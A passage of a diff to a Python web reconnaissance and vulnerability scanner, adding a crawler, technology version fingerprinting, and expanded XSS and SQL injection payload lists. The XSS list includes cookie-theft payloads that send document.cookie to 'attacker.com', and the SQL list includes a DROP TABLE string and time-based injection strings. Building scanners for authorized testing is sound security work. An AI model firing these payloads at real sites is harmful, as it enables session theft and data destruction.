+                    params = parse_qs(query)
+                    query = '&'.join(f"{k}={v[0]}" for k, v in sorted(params.items()))
+                
+                normalized = f"{parsed.scheme}://{netloc}{path}"
+                if query:
+                    normalized += f"?{query}"
+                return normalized
+            except Exception:
+                return url
+
+        def extract_links(html, current_url):
+            """Extract links with improved normalization and filtering"""
+            links = set()
+            try:
+                soup = BeautifulSoup(html, 'html.parser')
+                base_tag = soup.find('base', href=True)
+                base_href = base_tag['href'] if base_tag else current_url
+
+                # Helper to process extracted URLs
+                def process_url(url_str):
+                    try:
+                        full_url = normalize_url(url_str.strip(), base_href)
+                        parsed = urlparse(full_url)
+                        # Only include URLs on same domain/subdomain
+                        if parsed.netloc.endswith(base_domain):
+                            # Skip common non-content URLs and file types
+                            skip_patterns = [
+                                '.png', '.jpg', '.gif', '.css', '.js', '.ico', '.svg', 
+                                '.woff', '.ttf', '.pdf', '.zip', '.tar', '.gz'
+                            ]
+                            if not any(pat in parsed.path.lower() for pat in skip_patterns):
+                                links.add(full_url)
+                    except Exception:
+                        pass
+
+                # Extract URLs from different tags
+                for tag_type, attr in [
+                    ('a', 'href'), ('link', 'href'), ('img', 'src'),
+                    ('script', 'src'), ('form', 'action'), ('iframe', 'src')
+                ]:
+                    for tag in soup.find_all(tag_type, {attr: True}):
+                        url_str = tag[attr]
+                        if url_str and not url_str.startswith(('mailto:', 'tel:', 'javascript:', '#')):
+                            process_url(url_str)
+
+            except Exception as e:
+                if args.verbose:
+                    print(f"{Fore.YELLOW}[CRAWL]{Style.RESET_ALL} Link extraction error: {e}")
+            return links
+
+        # Enhanced headers with encoding support
+        headers = {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+            "Accept-Language": "en-US,en;q=0.5",
+            "Accept-Encoding": "gzip, deflate",
+            "Connection": "close"
+        }
+
+        # Rate limiting parameters
+        rate_limit_delay = 1.0  # Base delay between requests
+        max_retries = 3
+        retry_delay = 2.0
+
+        while to_crawl and len(crawled_urls) < max_pages:
+            current_url, depth = to_crawl.pop(0)
+            if depth >= max_depth:
+                continue
+                
+            current_domain = urlparse(current_url).netloc
+
+            # Skip if already crawled
+            if current_url in crawled_urls:
+                continue
+
+            # Rate limiting based on errors
+            if error_counts.get(current_domain, 0) > max_retries:
+                time.sleep(retry_delay)
+                error_counts[current_domain] = 0
+
+            try:
+                response = requests.get(
+                    current_url, 
+                    headers=headers, 
+                    timeout=args.timeout, 
+                    verify=False,
+                    allow_redirects=True
+                )
+                # Process the response
+                crawled_urls.add(current_url)
+                add_live_url(current_url, response.status_code, 'crawl')
+
+                # Extract links if it's HTML content
+                if 'text/html' in response.headers.get('content-type', '').lower():
+                    new_links = extract_links(response.text, current_url)
+                    for link in new_links:
+                        if link not in seen_urls:
+                            seen_urls.add(link)
+                            to_crawl.append(link)
+
+                # Successful request, reset error count
+                error_counts[current_domain] = 0
+                time.sleep(rate_limit_delay)  # Basic rate limiting
+
+            except requests.exceptions.RequestException as e:
+                if args.verbose:
+                    print(f"{Fore.YELLOW}[CRAWL]{Style.RESET_ALL} Failed to crawl {current_url}: {e}")
+                # Increment error count for this domain
+                error_counts[current_domain] = error_counts.get(current_domain, 0) + 1
+
+            except Exception as e:
+                if args.verbose:
+                    print(f"{Fore.YELLOW}[CRAWL]{Style.RESET_ALL} Unexpected error: {e}")
+                continue
+
+            # Progress update every 10 URLs
+            if len(crawled_urls) % 10 == 0:
+                print(f"{Fore.CYAN}[CRAWL]{Style.RESET_ALL} Progress: {len(crawled_urls)} URLs crawled, {len(to_crawl)} remaining")
+
+        print(f"{Fore.GREEN}[CRAWL]{Style.RESET_ALL} Crawled {len(crawled_urls)} pages from {url}")
+        return list(crawled_urls)
+
+    except Exception as e:
+        print(f"{Fore.RED}[CRAWL]{Style.RESET_ALL} Fatal crawling error: {e}")
+        return []
 
 def website_crawling(urls):
     """Enhanced website crawling phase with AI path prediction"""
@@ -1902,7 +2654,7 @@ class JSRecon:
 # TECHNOLOGY STACK DETECTION
 # ---------------------------
 def detect_technology(url):
-    """Enhanced technology stack detection with cloud and framework focus"""
+    """Enhanced technology stack detection with version fingerprinting"""
     tech_stack = {
         "cms": [],
         "frameworks": [],
@@ -1915,7 +2667,33 @@ def detect_technology(url):
         "cdn": [],
         "cloud_services": [],
         "security_tools": [],
-        "operating_systems": []
+        "operating_systems": [],
+        "versions": {}  # Store version information
+    }
+    
+    version_patterns = {
+        # CMS Versions
+        "wordpress": [
+            r'wp-content/themes/[^/]+/style.css\?ver=([0-9.]+)',
+            r'<meta name="generator" content="WordPress ([0-9.]+)"'
+        ],
+        "drupal": [
+            r'Drupal ([0-9.]+)',
+            r'jQuery.extend\(Drupal, { "settings": {"version":"([0-9.]+)"'
+        ],
+        # Framework Versions
+        "django": [r'__version__ = \'([0-9.]+)\''],
+        "laravel": [r'"laravel/framework": "([0-9.]+)"'],
+        "angular": [r'angular\.version\.full\s*=\s*[\'"]([0-9.]+)[\'"]'],
+        "react": [r'react@([0-9.]+)'],
+        # Database Versions
+        "mysql": [r'mysql\-([0-9.]+)'],
+        "postgresql": [r'PostgreSQL ([0-9.]+)'],
+        "mongodb": [r'mongodb/([0-9.]+)'],
+        # Web Server Versions
+        "nginx": [r'nginx/([0-9.]+)'],
+        "apache": [r'Apache/([0-9.]+)'],
+        "iis": [r'IIS/([0-9.]+)']
     }
     
     # Enhanced patterns
@@ -1953,18 +2731,70 @@ def detect_technology(url):
         content = response.text.lower()
         headers_lower = {k.lower(): v for k, v in response.headers.items()}
         
-        # CMS Detection
+        # Database Detection
+        db_indicators = {
+            "mysql": ["mysql_error", "mysql_fetch", "mysql_connect", "MySQL server version"],
+            "postgresql": ["pg_", "postgresql", "pgsql"],
+            "mongodb": ["mongodb", "mongo.connect", "mongoose"],
+            "redis": ["redis-server", "redis-cli", "Redis on"],
+            "elasticsearch": ["elasticsearch", "elastic.co"],
+            "cassandra": ["cassandra", "datastax"],
+            "oracle": ["oracle", "ora-", "sql*plus"],
+            "mssql": ["sql server", "sqlclient", "sqlexpress"]
+        }
+        
+        # Caching System Detection
+        cache_indicators = {
+            "redis": ["redis", "redis-cache"],
+            "memcached": ["memcached", "memcache"],
+            "varnish": ["varnish", "x-varnish"],
+            "cloudflare": ["cf-cache-status"],
+            "fastly": ["fastly-io", "x-fastly"],
+            "akamai": ["akamai-cache"]
+        }
+        
+        # CMS Detection with Enhanced Patterns
         cms_indicators = {
-            "wordpress": ["wp-content", "wp-includes", "wordpress", "/wp-json/"],
-            "joomla": ["joomla", "media/jui/", "templates/ja_purity/"],
-            "drupal": ["drupal", "sites/all/", "misc/drupal.js"],
-            "magento": ["magento", "static/version"],
-            "shopify": ["shopify"],
-            "prestashop": ["prestashop"],
-            "wix": ["wix.com", "static.parastorage.com"],
-            "squarespace": ["squarespace"],
-            "ghost": ["ghost", "assets/built/"],
-            "typo3": ["typo3", "typo3conf/"]
+            "wordpress": [
+                "wp-content", "wp-includes", "wordpress", "/wp-json/",
+                "wp-admin", "xmlrpc.php", "wp-login.php"
+            ],
+            "joomla": [
+                "joomla", "media/jui/", "templates/ja_purity/",
+                "com_content", "com_users", "Joomla!"
+            ],
+            "drupal": [
+                "drupal", "sites/all/", "misc/drupal.js",
+                "sites/default", "core/misc/drupal.js", "modules/node/"
+            ],
+            "magento": [
+                "magento", "static/version", "skin/frontend",
+                "Mage.Cookies", "mage/cookies.js"
+            ],
+            "shopify": [
+                "shopify", ".myshopify.com", "cdn.shopify.com",
+                "shopify-buy", "shopify.com"
+            ],
+            "prestashop": [
+                "prestashop", "pstheme", "prestashop-bootstrap",
+                "modules/ps_", "/themes/classic/"
+            ],
+            "wix": [
+                "wix.com", "static.parastorage.com", "_wixCssTopBar",
+                "wix-dropdown", "wix-code"
+            ],
+            "squarespace": [
+                "squarespace", "static1.squarespace.com", 
+                "squarespace-config", "squarespace.com"
+            ],
+            "ghost": [
+                "ghost", "assets/built/", "ghost-sdk",
+                "ghost-admin", "ghost.io"
+            ],
+            "typo3": [
+                "typo3", "typo3conf/", "typo3temp/",
+                "typo3/sysext/", "TYPO3 CMS"
+            ]
         }
         
         for cms, indicators in cms_indicators.items():
@@ -2041,15 +2871,61 @@ def detect_technology(url):
             if any(indicator in content for indicator in indicators):
                 tech_stack["analytics"].append(analytic)
         
+        # Database Detection
+        for db, indicators in db_indicators.items():
+            if any(indicator in content.lower() for indicator in indicators):
+                tech_stack["databases"].append(db)
+                
+        # Caching Detection
+        for cache, indicators in cache_indicators.items():
+            if any(indicator.lower() in str(headers_lower) for indicator in indicators):
+                tech_stack["caching"].append(cache)
+        
+        # Version Detection
+        for tech, patterns in version_patterns.items():
+            for pattern in patterns:
+                matches = re.findall(pattern, content)
+                if matches:
+                    tech_stack["versions"][tech] = matches[0]
+        
+        # Confidence Scoring
+        confidence_scores = {}
+        for category, items in tech_stack.items():
+            if category != "versions":
+                for item in items:
+                    score = 0
+                    # Multiple detection points increase confidence
+                    if item in str(headers_lower):
+                        score += 2
+                    if item.lower() in content.lower():
+                        score += 1
+                    if item in tech_stack.get("versions", {}):
+                        score += 3
+                    confidence_scores[item] = min(score, 5)  # Max score of 5
+        
         # Clean empty categories
         tech_stack = {k: v for k, v in tech_stack.items() if v}
         
         if tech_stack:
             print(f"{Fore.CYAN}[TECH]{Style.RESET_ALL} {url}")
             for category, technologies in tech_stack.items():
-                print(f"  {Fore.BLUE}• {category}:{Style.RESET_ALL} {', '.join(technologies)}")
+                if category == "versions":
+                    continue
+                tech_list = []
+                for tech in technologies:
+                    version = tech_stack.get("versions", {}).get(tech, "")
+                    confidence = confidence_scores.get(tech, 0)
+                    tech_str = tech
+                    if version:
+                        tech_str += f" v{version}"
+                    tech_str += f" (conf: {confidence}/5)"
+                    tech_list.append(tech_str)
+                print(f"  {Fore.BLUE}• {category}:{Style.RESET_ALL} {', '.join(tech_list)}")
         
-        return tech_stack
+        return {
+            "tech_stack": tech_stack,
+            "confidence_scores": confidence_scores
+        }
         
     except Exception as e:
         if args.verbose:
@@ -2072,7 +2948,81 @@ def technology_detection(urls):
     return results
 
 # ---------------------------
-# VULNERABILITY SCANNING FUNCTIONS (keep your existing ones)
+# ENHANCED CRAWLING FUNCTIONS
+# ---------------------------
+def extract_forms(soup):
+    """Extract and analyze HTML forms"""
+    forms = []
+    for form in soup.find_all('form'):
+        form_data = {
+            'action': form.get('action', ''),
+            'method': form.get('method', 'get').upper(),
+            'inputs': []
+        }
+        
+        for input_field in form.find_all(['input', 'textarea', 'select']):
+            input_data = {
+                'name': input_field.get('name', ''),
+                'type': input_field.get('type', 'text'),
+                'id': input_field.get('id', ''),
+                'required': input_field.has_attr('required'),
+                'default': input_field.get('value', '')
+            }
+            form_data['inputs'].append(input_data)
+            
+        forms.append(form_data)
+    return forms
+
+def extract_javascript(soup, url):
+    """Extract and analyze JavaScript files and inline scripts"""
+    js_info = {
+        'inline_scripts': [],
+        'external_scripts': [],
+        'event_handlers': []
+    }
+    
+    # Extract inline scripts
+    for script in soup.find_all('script'):
+        if script.string:
+            js_info['inline_scripts'].append(script.string)
+        elif 'src' in script.attrs:
+            js_info['external_scripts'].append(urljoin(url, script.get('src')))
+    
+    # Extract event handlers
+    for tag in soup.find_all(True):
+        for attr in tag.attrs:
+            if attr.startswith('on'):  # onclick, onmouseover, etc.
+                js_info['event_handlers'].append({
+                    'element': tag.name,
+                    'event': attr,
+                    'handler': tag[attr]
+                })
+    
+    return js_info
+
+def parse_javascript(content):
+    """Basic JavaScript parsing for additional endpoints"""
+    endpoints = set()
+    
+    # Common patterns for endpoints in JavaScript
+    patterns = [
+        r'fetch\([\'"]([^\'"]+)[\'"]\)',
+        r'axios\.[get|post|put|delete]\([\'"]([^\'"]+)[\'"]\)',
+        r'url:\s*[\'"]([^\'"]+)[\'"]',
+        r'href[=:]\s*[\'"]([^\'"]+)[\'"]',
+        r'src[=:]\s*[\'"]([^\'"]+)[\'"]',
+        r'path:\s*[\'"]([^\'"]+)[\'"]',
+        r'endpoint:\s*[\'"]([^\'"]+)[\'"]'
+    ]
+    
+    for pattern in patterns:
+        matches = re.findall(pattern, content)
+        endpoints.update(matches)
+    
+    return list(endpoints)
+
+# ---------------------------
+# VULNERABILITY SCANNING FUNCTIONS
 # ---------------------------
 def nuclei_scan(url):
     """Run Nuclei vulnerability scanning"""
@@ -2173,14 +3123,33 @@ def check_security_headers(url):
         return None
 
 def check_xss_vulnerabilities(url):
-    """Check for XSS vulnerabilities"""
-    xss_payloads = [
-        "<script>alert('XSS')</script>",
-        "\"><script>alert('XSS')</script>",
-        "javascript:alert('XSS')",
-        "onmouseover=alert('XSS')",
-        "<img src=x onerror=alert('XSS')>"
-    ]
+    """Enhanced XSS detection with stored XSS and parameter fuzzing"""
+    xss_payloads = {
+        "reflected": [
+            "<script>alert('XSS')</script>",
+            "\"><script>alert('XSS')</script>",
+            "javascript:alert('XSS')",
+            "onmouseover=alert('XSS')",
+            "<img src=x onerror=alert('XSS')>",
+            "<svg/onload=alert('XSS')>",
+            "'-alert('XSS')-'",
+            "\"-alert('XSS')-\"",
+            "';alert('XSS')//",
+            "<scr<script>ipt>alert('XSS')</scr</script>ipt>"
+        ],
+        "stored": [
+            "<script>fetch('http://attacker.com/'+document.cookie)</script>",
+            "<img src=x onerror=this.src='http://attacker.com/'+document.cookie>",
+            "<svg/onload=fetch('http://attacker.com/'+document.cookie)>",
+            "<script>new Image().src='http://attacker.com/'+document.cookie</script>"
+        ],
+        "dom": [
+            "javascript:alert(document.domain)",
+            "#<img src=x onerror=alert(document.domain)>",
+            "javascript:eval('ale'+'rt(document.domain)')",
+            "<script>$(function(){alert(1)})</script>"
+        ]
+    }
     
     vulnerabilities = []
     
@@ -2207,14 +3176,33 @@ def check_xss_vulnerabilities(url):
     return vulnerabilities
 
 def check_sql_injection(url):
-    """Check for SQL injection vulnerabilities"""
-    sql_payloads = [
-        "' OR '1'='1",
-        "' UNION SELECT 1,2,3--",
-        "' AND 1=1--",
-        "'; DROP TABLE users--",
-        "' OR 1=1--"
-    ]
+    """Enhanced SQL injection detection with time-based tests"""
+    sql_payloads = {
+        "error": [
+            "' OR '1'='1",
+            "' UNION SELECT 1,2,3--",
+            "' AND 1=1--",
+            "'; DROP TABLE users--",
+            "' OR 1=1--"
+        ],
+        "time": [
+            # MySQL
+            "' AND SLEEP(5)--",
+            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+            # PostgreSQL
+            "'; SELECT pg_sleep(5)--",
+            # MSSQL
+            "'; WAITFOR DELAY '0:0:5'--",
+            # Oracle
+            "'; BEGIN DBMS_LOCK.SLEEP(5); END;--"
+        ],
+        "boolean": [
+            "' AND 1=1--",
+            "' AND 1=2--",
+            "' OR 1=1--",
+            "' OR 1=2--"
+        ]
+    }
     
     sql_errors = [
         'sql syntax', 'mysql', 'oracle', 'sqlserver', 'postgresql',
@@ -2364,13 +3352,26 @@ def vulnerability_scanning(subdomains, urls):
 # MAIN EXECUTION - ENHANCED
 # ---------------------------
 def run():
-    """Enhanced main execution function with smart recon"""
+    """Enhanced main execution function with full state management"""
     if not args.domain and not args.url and not args.input:
         print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} Please provide a domain (-d), URL (-u), or input file (-i)")
         return
-        
+    
     # Initialize enhanced components
     js_recon = JSRecon()
+    
+    # Initialize state manager
+    scan_state = None
+    if args.domain:
+        scan_state = ScanState(args.domain)
+    elif args.url:
+        scan_state = ScanState(urlparse(args.url).netloc)
+    
+    # Attempt state resume
+    if args.resume and scan_state and scan_state.load():
+        print(f"{Fore.GREEN}[STATE]{Style.RESET_ALL} Resuming previous scan...")
+    else:
+        print(f"{Fore.CYAN}[STATE]{Style.RESET_ALL} Starting new scan...")
     
     # Normalize input
     targets = []
